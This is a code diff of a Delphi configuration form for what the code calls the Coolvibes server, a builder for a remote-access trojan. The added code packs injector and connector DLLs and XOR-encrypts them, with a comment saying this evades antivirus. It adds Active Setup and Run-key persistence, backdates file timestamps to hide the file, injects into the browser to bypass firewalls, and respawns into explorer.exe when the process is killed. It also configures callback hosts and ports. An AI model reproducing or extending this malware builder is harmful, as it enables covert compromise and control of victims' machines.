@@ -7,73 +7,78 @@ uses
   Dialogs, StdCtrls, Buttons,
   SettingsDef, {Esta es la unidad para leer la configuracion}
   MadRes,      {Unidad para cambiar el icono de un EXE}
+  ShellApi,
   ExtCtrls, ComCtrls,
   UnitVariables;
 
 type
   TFormConfigServer = class(TForm)
-    EditID:     TEdit;
-    EditServerPath: TEdit;
-    LabelPath:  TLabel;
-    BtnBrowse:  TSpeedButton;
-    OpenDialog: TOpenDialog;
-    GroupBox1:  TGroupBox;
-    ScrollBox1: TScrollBox;
-    BtnGuardarConfig: TSpeedButton;
-    Bevel1:     TBevel;
-    Label1:     TLabel;
-    EditIP:     TEdit;
-    Label2:     TLabel;
+    GroupBox2: TGroupBox;
+    Label2: TLabel;
+    EditIP: TEdit;
+    Label3: TLabel;
     EditPuerto: TEdit;
-    Label3:     TLabel;
-    Bevel2:     TBevel;
-    Bevel3:     TBevel;
-    Label4:     TLabel;
-    ImageIcon:  TImage;
-    Bevel4:     TBevel;
-    StatusBar:  TStatusBar;
-    BtnSalir:   TSpeedButton;
-    MemoOutput: TMemo;
+    Label1: TLabel;
+    EditID: TEdit;
+    GroupBox3: TGroupBox;
     CheckBoxCopiar: TCheckBox;
-    Label7:     TLabel;
-    Label8:     TLabel;
-    EditFileName: TEdit;
-    GrpBoxCopiarA: TGroupBox;
-    CheckBoxMelt: TCheckBox;
-    Label11:    TLabel;
-    Bevel5:     TBevel;
-    Label12:    TLabel;
-    CheckBoxRun: TCheckBox;
-    Label14:    TLabel;
-    Label15:    TLabel;
-    EditRunName: TEdit;
-    Bevel6:     TBevel;
     EditCopyTo: TEdit;
-    ImageHintCopiarA: TImage;
-    Label9:     TLabel;
+    Label8: TLabel;
+    EditFileName: TEdit;
+    CheckBoxMelt: TCheckBox;
     CheckBoxCopiarConFechaAnterior: TCheckBox;
-    ImageHintFechaAnterior: TImage;
+    CheckBoxRun: TCheckBox;
+    Label15: TLabel;
+    EditRunName: TEdit;
+    MemoOutput: TMemo;
+    StatusBar: TStatusBar;
+    Bevel1: TBevel;
+    Label6: TLabel;
+    GroupBox1: TGroupBox;
+    BtnGuardarConfig: TSpeedButton;
+    BtnSalir: TSpeedButton;
+    Bevel4: TBevel;
+    ImageIcon: TImage;
+    Label4: TLabel;
+    ListViewConexionesConfig: TListView;
+    SpeedButton1: TSpeedButton;
+    SpeedButton2: TSpeedButton;
+    SpeedButton3: TSpeedButton;
+    SpeedButton4: TSpeedButton;
+    OpenDialog: TOpenDialog;
+    CheckBoxInyectar: TCheckBox;
+    CheckboxUPX: TCheckBox;
+    CheckBoxPersistencia: TCheckBox;
     Label5: TLabel;
     EditPluginName: TEdit;
-    procedure BtnBrowseClick(Sender: TObject);
-    procedure EditPuertoExit(Sender: TObject);
+    CheckBoxActiveSetup: TCheckBox;
+    Label7: TLabel;
+    EditActiveSetup: TEdit;
+    CheckBoxCifrar: TCheckBox;
     procedure FormShow(Sender: TObject);
     procedure ImageIconClick(Sender: TObject);
     procedure BtnGuardarConfigClick(Sender: TObject);
     procedure BtnSalirClick(Sender: TObject);
-    procedure EditTimeToNotifyExit(Sender: TObject);
     procedure EditPuertoKeyPress(Sender: TObject; var Key: char);
-    procedure EditPuertoEndDrag(Sender, Target: TObject; X, Y: integer);
     procedure EditIPKeyPress(Sender: TObject; var Key: char);
     procedure CheckBoxCopiarClick(Sender: TObject);
     procedure CheckBoxRunClick(Sender: TObject);
     procedure FormCreate(Sender: TObject);
+    procedure SpeedButton1Click(Sender: TObject);
+    procedure SpeedButton4Click(Sender: TObject);
+    procedure SpeedButton2Click(Sender: TObject);
+    procedure SpeedButton3Click(Sender: TObject);
+    procedure CheckBoxInyectarClick(Sender: TObject);
+    procedure EditActiveSetupClick(Sender: TObject);
+    procedure CheckBoxActiveSetupClick(Sender: TObject);
+    procedure FormClose(Sender: TObject; var Action: TCloseAction);
   private
     { Private declarations }
     IconPath: string;
     function ComprobarDatosValidos(): boolean;
   public
     { Public declarations }
+    Ipsypuertos : string; //localhost:81¬google.com:77¬
   end;
 
 var
@@ -101,33 +106,36 @@ end;
 
 
 procedure TFormConfigServer.FormShow(Sender: TObject);
+var
+tmpstr, tmpstr2 : string;
+item   : Tlistitem;
 begin
   StatusBar.Panels[0].Text := 'Seleccione el servidor que desea modificar.';
   IconPath := '';
-  EditServerPath.Text := '';
   MemoOutput.Clear;
   MemoOutput.Lines.Append('> Listo.');
   //Icono por defecto
-  if FileExists(ExtractFilePath(ParamStr(0)) + 'Imagenes\ExeBMP.bmp') then
-    ImageIcon.Picture.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Imagenes\ExeBMP.bmp');
+  if FileExists(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\ExeBMP.bmp') then
+    ImageIcon.Picture.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\ExeBMP.bmp');
   CheckBoxCopiarClick(Sender);  //Para que desactive o active los campos
   CheckBoxRunClick(Sender);//Para que desactive o active los campos
-end;
+  CheckBoxInyectarClick(Sender);//Para que desactive o active los campos
+  CheckBoxActiveSetupClick(Sender);//Para que desactive o active los campos
 
-procedure TFormConfigServer.BtnBrowseClick(Sender: TObject);
-begin
-  with OpenDialog do
+  tmpstr := ipsypuertos; //Cargamos los hosts y los puertos al listview
+  listviewconexionesconfig.Clear;
+  while(Pos('¬', tmpstr) > 0) do
   begin
-    Title      := 'Abrir servidor de Coolvibes ' + VersionCool + '...';
-    Options    := [ofFileMustExist]; //solo deja seleccionar archivos que existan
-    Filter     :=
-      'Servidor de Coolvibes (*.exe, *.pif, *.scr, *.com, *.bat, *.cmd)|*.exe;*.pif;*.scr;*.com;*.bat;*.cmd|Todos los archivos (*.*)|*.*';
-    DefaultExt := 'exe';
-    InitialDir := GetCurrentDir();
-    if Execute then
-      EditServerPath.Text := FileName;
+    tmpstr2 := Copy(tmpstr, 1, Pos('¬', tmpstr) - 1);
+    Delete(tmpstr, 1, Pos('¬', tmpstr));
+    item := listviewconexionesconfig.Items.Add;
+    item.Caption := Copy(tmpstr2, 1, Pos(':', tmpstr2) - 1);
+    Delete(tmpstr2, 1, Pos(':', tmpstr2));
+    item.SubItems.Add(tmpstr2);
   end;
 end;
+
+
 
 //Función para comprobar que todos los datos son validos
 function TFormConfigServer.ComprobarDatosValidos(): boolean;
@@ -135,25 +143,8 @@ var
   s: string;
 begin
   Result := True;
-  //Comprobamos que sean correctos los datos del EditServerPath
-  if EditServerPath.Text = '' then
-  begin
-    //No seleccionaron servidor
-    BtnBrowseClick(nil);
-    Result := False;
-    Exit;
-  end;
-  //Comprobamos que sean validos los datos del EditPuerto
-  if (StrToIntDef(EditPuerto.Text, -1) = -1) or
-    (StrToInt(EditPuerto.Text) > 65535) or (StrToInt(EditPuerto.Text) < 1) then
-  begin
-    StatusBar.Panels[0].Text := 'El puerto debe ser un número entre 1 y 65535';
-    MessageBeep($FFFFFFFF);
-    //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
-    EditPuerto.SetFocus;
-    Result := False;
-    exit;
-  end;
+
+
  { //Comprobamos que sean correctos los datos del EditTimeToNotify
   if (StrToIntDef(EditTimeToNotify.Text, -1) = -1) or
     (StrToInt(EditTimeToNotify.Text) < 1) then
@@ -173,24 +164,26 @@ begin
       //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
       EditPluginName.SetFocus;
       Result := False;
+      StatusBar.Panels[0].Text :=
+        'Tienes que establecer un nombre al plugin';
+
       exit;
   end;
-  if CheckBoxCopiar.Checked then
-  begin
-    s := ExtractFileExt(EditFileName.Text);
-    if s = '' then
-      EditFileName.Text := EditFileName.Text + '.exe';
-    if (s <> '.exe') and (s <> '.com') and (s <> '.scr') and (s <> '.pif') and
-      (s <> '.bat') and (s <> '.cmd') then
+
+  s := EditPluginName.Text;
+    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
+      (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or
+      (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
     begin
       StatusBar.Panels[0].Text :=
-        'Extensión no válida. Debe ser: .exe, .com, .scr, .pif, .bat ó .cmd';
+        'Nombre del plugin inválido. No puede tener ninguno de los siguientes carácteres: */?"<>|';
       MessageBeep($FFFFFFFF);
       //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
-      EditFileName.SetFocus;
+      EditCopyTo.SetFocus;
       Result := False;
       exit;
     end;
+
     if EditCopyTo.Text[Length(EditCopyTo.Text)] <> '\' then
       EditCopyTo.Text := EditCopyTo.Text + '\';
     s := EditCopyTo.Text;
@@ -207,17 +200,8 @@ begin
       exit;
     end;
   end;
-end;
 
-procedure TFormConfigServer.EditPuertoExit(Sender: TObject);
-begin
-  ComprobarDatosValidos();
-end;
 
-procedure TFormConfigServer.EditTimeToNotifyExit(Sender: TObject);
-begin
-  ComprobarDatosValidos();
-end;
 
 procedure TFormConfigServer.ImageIconClick(Sender: TObject);
 begin
@@ -239,20 +223,164 @@ begin
   end;
 end;
 
+function leerarchivo(f:string):string;
+var
+  ServerFile             :File;
+  Tamano : integer;
+begin
+  FileMode := fmopenread;
+  AssignFile(ServerFile, f);     //archivo de CoolServer
+  Reset(ServerFile, 1);
+  tamano := FileSize(ServerFile);
+  SetLength(Result, tamano);
+  BlockRead(ServerFile, Result[1], tamano);  //cargado archivo a servdll
+  CloseFile(ServerFile);
+end;
+
+procedure borrararchivo(s:string);
+begin
+  if(fileexists(s)) then
+    deletefile(s);
+end;
+
+function cifrar(text: ansistring;i:integer): ansistring;
+var
+  iloop         :integer;
+begin
+  for iloop := 1 to length(text) do
+    text[iloop] := chr(ord(text[iloop]) xor i);//funcion de cifrado simple para evadir antiviruses
+  result := text;
+end;
+
+procedure FinalizarInstalacion(exito:boolean);
+begin
+  borrararchivo(extractfiledir(paramstr(0))+'\~jeringa.exe');
+  borrararchivo(extractfiledir(paramstr(0))+'\~monitor.dll');
+  borrararchivo(extractfiledir(paramstr(0))+'\~conectador.dll');
+  if not exito then
+  borrararchivo(extractfiledir(paramstr(0))+'\Servidor.exe');
+end;
+
 procedure TFormConfigServer.BtnGuardarConfigClick(Sender: TObject);
 var
-  ConfigToSave: PSettings;
+  ConfigToSave  : PSettings;
+  Servidor      : string;
+  i             : integer;
+  num           : integer;
+  num2          : integer;
+  monitor       : string;
+  conectador    : string;
+  StartInfo: TStartupInfo;      //Para esperar a que finalice upx.exe
+  ProcInfo: TProcessInformation;
 begin
+  finalizarinstalacion(true); //Para borrar los archivos de alguna otra instalacion si existiesen
+  Servidor := extractfiledir(paramstr(0))+'\Servidor.exe';
+  randomize;
+  if checkboxcifrar.checked then
+  begin
+    num := random(250); //numero para cifrar los recursos
+
+    num2 := random(250); //numero2 para cifrar los recursos
+    while num = num2 do //poco probable :p
+      num2 := random(250);
+  end
+  else
+  begin
+    num := 0;  //  numero XOR 0 = numero
+    num2 := 0; //  numero XOR 0 = numero
+  end;
   if ComprobarDatosValidos() then
   begin
-    //Escribir configuración
-    MemoOutput.Lines.Append('> Escribiendo la configuración en el servidor...');
-    New(ConfigToSave);
+    //Primero copiamos los archivos necesarios
+    MemoOutput.Lines.Append('> Copiando los archivos necesarios...');
 
-    ConfigToSave.sHost   := EditIP.Text;
-    ConfigToSave.sPort   := EditPuerto.Text;
+    if CheckBoxInyectar.Checked then   //con inyección
+    begin
+
+      if(fileexists(extractfiledir(paramstr(0))+'\Recursos\Jeringa.exe')) then
+        CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\Jeringa.exe'), pchar(Servidor),false)
+      else
+      begin
+        StatusBar.Panels[0].Text := 'El archivo Jeringa.exe no existe';
+        MemoOutput.Lines.Append('> Error: El archivo Jeringa.exe no existe');
+        exit;
+      end;
+      MemoOutput.Lines.Append('> Jeringa.exe correctamente copiado.');
+
+      if(CheckBoxPersistencia.Checked) then
+      begin
+        if(fileexists(extractfiledir(paramstr(0))+'\Recursos\Monitor.dll')) then
+          CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\Monitor.dll'), pchar(extractfiledir(paramstr(0))+'\~monitor.dll'),false)
+        else
+        begin
+          FinalizarInstalacion(false);
+          StatusBar.Panels[0].Text := 'El archivo Monitor.dll no existe.';
+          MemoOutput.Lines.Append('> Error: El archivo Monitor.dll no existe.');
+          exit;
+        end;
+          MemoOutput.Lines.Append('> Monitor.dll correctamente copiado.');
+      end;
+
+      if(fileexists(extractfiledir(paramstr(0))+'\Recursos\conectador.dll')) then
+          CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\conectador.dll'), pchar(extractfiledir(paramstr(0))+'\~conectador.dll'),false)
+      else
+      begin
+        FinalizarInstalacion(false);
+        StatusBar.Panels[0].Text := 'El archivo Conectador.dll no existe.';
+        MemoOutput.Lines.Append('> Error: El archivo Conectador.dll no existe.');
+        exit;
+      end;
+          MemoOutput.Lines.Append('> Conectador.dll correctamente copiado.');
+
+      if(CheckBoxUPX.Checked) then
+      begin
+        MemoOutput.Lines.Append('Comprimiendo conectador.dll y monitor.dll con UPX...');
+        FillChar(StartInfo, SizeOf(StartInfo), 0);
+        StartInfo.cb := SizeOf(StartInfo);
+
+        CreateProcess(PChar(extractfiledir(paramstr(0))+'\Recursos\upx.exe'), pchar(' '+extractfiledir(paramstr(0))+'\~conectador.dll'), nil, nil, false, 0,nil, nil, StartInfo, ProcInfo);
+        WaitForSingleObject(ProcInfo.hProcess, INFINITE);  //Esperamos a que acabe
+        if (checkboxpersistencia.Checked) then
+        begin
+          CreateProcess(PChar(extractfiledir(paramstr(0))+'\Recursos\upx.exe'), pchar(' '+extractfiledir(paramstr(0))+'\~monitor.dll'), nil, nil, false, 0,nil, nil, StartInfo, ProcInfo);
+          WaitForSingleObject(ProcInfo.hProcess, INFINITE);  //Esperamos a que acabe
+        end;
+        MemoOutput.Lines.Append('Comprimidos!');
+      end;
+      if checkboxpersistencia.Checked then
+        monitor    := cifrar(cifrar(leerarchivo(extractfiledir(paramstr(0))+'\~monitor.dll'),num),num2);
+      conectador := cifrar(cifrar(leerarchivo(extractfiledir(paramstr(0))+'\~conectador.dll'),num),num2);
+
+    end
+    else
+    begin //sin inyección
+      if(fileexists(extractfiledir(paramstr(0))+'\Recursos\conectador.exe')) then
+          CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\conectador.exe'), pchar(Servidor),false)
+        else
+        begin
+          StatusBar.Panels[0].Text := 'El archivo conectador.exe no existe.';
+          MemoOutput.Lines.Append('> Error: El archivo conectador.exe no existe.');
+          exit;
+        end;
+         MemoOutput.Lines.Append('> Conectador.exe correctamente copiado.');
+    end;
+
+
+    if(checkboxinyectar.Checked) then
+    begin
+      if checkboxpersistencia.Checked then
+        MemoOutput.Lines.Append('> Monitor.dll (Persistencia) añadida => +('+inttostr(length(monitor))+')');
+      MemoOutput.Lines.Append('> Conectador.dll añadida => +('+inttostr(length(conectador))+')');
+    MemoOutput.Lines.Append('> Escribiendo la configuración al servidor...');
+    end
+    else
+    MemoOutput.Lines.Append('> Escribiendo la configuración al servidor...');
+    New(ConfigToSave);
+    ConfigToSave.sHosts := '';
+    for i := 0 to ListViewConexionesConfig.Items.Count - 1 do
+      if(ListViewConexionesConfig.Items[i] <> nil) then   //creamos la lista de hosts
+        ConfigToSave.sHosts := ConfigToSave.sHosts+ListViewConexionesConfig.Items[i].caption+':'+ListViewConexionesConfig.Items[i].SubItems[0]+'¬';
     ConfigToSave.sID     := EditID.Text;
-    ConfigToSave.iPort   := StrToInt(EditPuerto.Text);
     ConfigToSave.sPluginName := EditPluginName.Text;
     ConfigToSave.bCopiarArchivo := CheckBoxCopiar.Checked;
     ConfigToSave.sFileNameToCopy := EditFileName.Text;
@@ -261,23 +389,28 @@ begin
     ConfigToSave.bArranqueRun := CheckBoxRun.Checked;
     ConfigToSave.sRunRegKeyName := EditRunName.Text;
     ConfigToSave.bCopiarConFechaAnterior := CheckBoxCopiarConFechaAnterior.Checked;
-
-    if WriteSettings(PChar(EditServerPath.Text), ConfigToSave) = True then
+    ConfigToSave.sActiveSetupKeyName := EditActiveSetup.Text;
+    ConfigToSave.bArranqueActiveSetup := CheckBoxActiveSetup.Checked;
+    ConfigToSave.snumerocifrado := inttostr(num);
+    ConfigToSave.snumerocifrado2 := inttostr(num2);
+    if WriteSettings(PChar(Servidor), ConfigToSave, monitor,conectador) = True then
     begin
       StatusBar.Panels[0].Text := 'La configuración se guardó con éxito.';
       MemoOutput.Lines.Append('> La configuración se guardó con éxito.');
+      FinalizarInstalacion(true);
     end
     else
     begin
       MessageBeep($FFFFFFFF);
       StatusBar.Panels[0].Text := 'No se pudo guardar la configuración.';
       MemoOutput.Lines.Append('> No se pudo guardar la configuración.');
+     // FinalizarInstalacion(false);
     end;
     Dispose(ConfigToSave); //Libera la configuracion
     if IconPath <> '' then //cambiar icono
     begin
       MemoOutput.Lines.Append('> Cambiando el icono al servidor...');
-      if UpdateExeIcon(EditServerPath.Text, 'MAINICON', IconPath) = True then
+      if UpdateExeIcon(Servidor, 'MAINICON', IconPath) = True then
         MemoOutput.Lines.Append('> El ícono se cambió con éxito.')
       else
         MemoOutput.Lines.Append('> No se pudo cambiar el ícono.');
@@ -312,12 +445,6 @@ begin
 end;
 
 //Por si pega un texto sobre puerto o en TimeToNotify
-procedure TFormConfigServer.EditPuertoEndDrag(Sender, Target: TObject; X, Y: integer);
-begin
-  ComprobarDatosValidos();
-end;
-
-
 procedure TFormConfigServer.CheckBoxCopiarClick(Sender: TObject);
 begin
   //Activa o desactiva los valores correspondientes
@@ -326,8 +453,7 @@ begin
   CheckBoxMelt.Enabled := CheckBoxCopiar.Checked;
   CheckBoxCopiarConFechaAnterior.Enabled := CheckBoxCopiar.Checked;
   Label8.Enabled  := CheckBoxCopiar.Checked; //nombre de archivo
-  Label11.Enabled := CheckBoxCopiar.Checked; //melt
-  Label9.Enabled  := CheckBoxCopiar.Checked; //fecha anterior
+  Label6.enabled := CheckBoxCopiar.Checked;
 end;
 
 procedure TFormConfigServer.CheckBoxRunClick(Sender: TObject);
@@ -352,15 +478,171 @@ begin
     #13#10 + '%SysDir% -> Se reemplaza por el directorio de sistema (Por ejemplo C:\System32\)'
     +
     #13#10 + '%TempDir% -> Se reemplaza por el directorio de archivos temporales (Por ejemplo C:\Temp\)' +
+    #13#10 + '%AppDir% -> Se reemplaza por el directorio de datos de aplicaciones (Por ejemplo C:\Documents and Settings\user\appdata\) (Recomendado)' +
     #13#10 + '%RootDir% -> Se reemplaza por la ruta principal del directorio de Windows (Por ejemplo C:\)';
-  ImageHintCopiarA.Hint := s;
+  EditCopyTo.Hint := s;
 
   s := 'Cuando el servidor sea copiado a la carpeta de destino, su fecha de' + #13#10 +
     'modificación cambiará por una anterior de modo que no pueda encotrarse' + #13#10 +
     'de modo que no pueda encontrarse facilmente al listar archivos por fecha' + #13#10 +
     'de modificación.';
-  ImageHintFechaAnterior.Hint := s;
+  CheckBoxCopiarConFechaAnterior.Hint := s;
 
+  s := 'Cuando el proceso servidor sea matado volvera a iniciarse e inyectarse' + #13#10 +
+    'Si es matado más de tres veces se inyectara en explorer.exe para no ser tan visible' + #13#10+
+    'Si el archivo donde se instala es borrado volverá a copiarse en otro directorio con un nombre aleatorio'+#1310+
+    'Atención: Activar esta opción incrementa el tamaño del servidor';
+  CheckBoxPersistencia.Hint := s;
+
+    s := 'El servidor se inyectará en el navegador predeterminado para saltarse firewalls' + #13#10 +
+    'Atención: Activar esta opción incrementa el tamaño del servidor';
+  CheckBoxInyectar.Hint := s;
 end;
 
+procedure TFormConfigServer.SpeedButton1Click(Sender: TObject);
+var
+item : Tlistitem;
+s:string;
+begin
+
+    s := EditIP.Text;
+    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
+      (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or
+      (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
+    begin
+      StatusBar.Panels[0].Text :=
+        'IP o DNS inválida. No puede tener ninguno de los siguientes carácteres: */?"<>|';
+      MessageBeep($FFFFFFFF);
+      //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
+      EditIP.SetFocus;
+      exit;
+    end;
+
+  if((EditIp.text = '') or (EditPuerto.text = '')) then
+    exit;
+
+  if( not ((strtointdef(EditPuerto.text,-1)>0) or (strtointdef(EditPuerto.text,-1)<65555))) then
+    exit;
+  item := ListViewConexionesConfig.items.Add;
+  item.Caption := EditIp.text;
+  item.SubItems.Add(EditPuerto.text);
+  EditIp.text := '';
+  EditPuerto.text := '';
+end;
+
+procedure TFormConfigServer.SpeedButton4Click(Sender: TObject);
+begin
+if listviewconexionesconfig.Selected <> nil then
+  listviewconexionesconfig.Selected.delete;
+end;
+
+procedure TFormConfigServer.SpeedButton2Click(Sender: TObject);
+var
+  i :integer;
+  value1, value2 : string;
+begin
+  if listviewconexionesconfig.Selected <> nil then
+  begin
+    i := listviewconexionesconfig.Selected.Index;
+    value1 := listviewconexionesconfig.Selected.Caption;
+    value2 := listviewconexionesconfig.Selected.SubItems[0];
+    if i <> 0 then
+    begin
+      listviewconexionesconfig.selected.Caption := listviewconexionesconfig.Items.Item[i - 1].Caption;
+      listviewconexionesconfig.Selected.SubItems[0] := listviewconexionesconfig.Items.Item[i - 1].SubItems[0];
+      listviewconexionesconfig.Items.Item[i - 1].Caption := value1;
+      listviewconexionesconfig.Items.Item[i - 1].SubItems[0] := value2;
+      listviewconexionesconfig.Items.Item[i - 1].Selected := true;
+      
+    end;
+  end;
+end;
+
+procedure TFormConfigServer.SpeedButton3Click(Sender: TObject);
+var
+i :integer;
+value1, value2 : string;
+begin
+  if listviewconexionesconfig.Selected <> nil then
+  begin
+    i := listviewconexionesconfig.Selected.Index;
+    value1 := listviewconexionesconfig.Selected.Caption;
+    value2 := listviewconexionesconfig.Selected.SubItems[0];
+    if i <> listviewconexionesconfig.Items.count -1  then
+    begin
+      listviewconexionesconfig.selected.Caption := listviewconexionesconfig.Items.Item[i + 1].Caption;
+      listviewconexionesconfig.Selected.SubItems[0] := listviewconexionesconfig.Items.Item[i + 1].SubItems[0];
+      listviewconexionesconfig.Items.Item[i + 1].Caption := value1;
+      listviewconexionesconfig.Items.Item[i + 1].selected := true;
+      listviewconexionesconfig.Items.Item[i + 1].SubItems[0] := value2;
+    end;
+  end;
+end;
+
+procedure TFormConfigServer.CheckBoxInyectarClick(Sender: TObject);
+begin
+  checkboxpersistencia.enabled := Checkboxinyectar.Checked;
+  checkboxupx.Enabled := Checkboxinyectar.Checked;
+  checkboxcifrar.Enabled := Checkboxinyectar.Checked;
+end;
+
+procedure TFormConfigServer.EditActiveSetupClick(Sender: TObject);
+const
+  caracteres = '1234567890ABCDEF';
+var
+  clave : string;
+  caracter : string;
+  i, o :integer;
+begin
+  //Estilo: {1BD81F78-FDC7-FE07-3BEF-78ED6B103A24}
+  clave := '{';
+
+  for i := 0 to 7 do
+  begin
+  Randomize; //no es muy necesario pero bueno...
+  caracter := caracteres[ Random(length(caracteres))+1 ];
+  clave := clave+caracter;
+  end;
+  clave := clave + '-';
+
+  for o := 0 to 2 do
+  begin
+    for i := 0 to 3 do
+    begin
+      Randomize; //no es muy necesario pero bueno...
+      caracter := caracteres[ Random(length(caracteres))+1 ];
+      clave := clave+caracter;
+    end;
+    clave := clave + '-';
+  end;
+
+  for i := 0 to 11 do
+  begin
+    Randomize; //no es muy necesario pero bueno...
+    caracter := caracteres[ Random(length(caracteres))+1 ];
+    clave := clave+caracter;
+  end;
+
+  clave := clave+'}';
+  editactivesetup.Text := clave;
+end;
+
+procedure TFormConfigServer.CheckBoxActiveSetupClick(Sender: TObject);
+begin
+  EditActiveSetup.Enabled := CheckBoxActiveSetup.Checked;
+  Label7.Enabled := CheckBoxActiveSetup.Checked;
+end;
+
+procedure TFormConfigServer.FormClose(Sender: TObject;
+  var Action: TCloseAction);
+var
+i:integer;
+begin
+  ipsypuertos :='';
+  for i := 0 to ListViewConexionesConfig.Items.Count - 1 do
+  begin
+    if(ListViewConexionesConfig.Items[i] <> nil) then
+    ipsypuertos := ipsypuertos+ListViewConexionesConfig.Items[i].caption+':'+ListViewConexionesConfig.Items[i].SubItems[0]+'¬';
+  end;
+end;
 end.
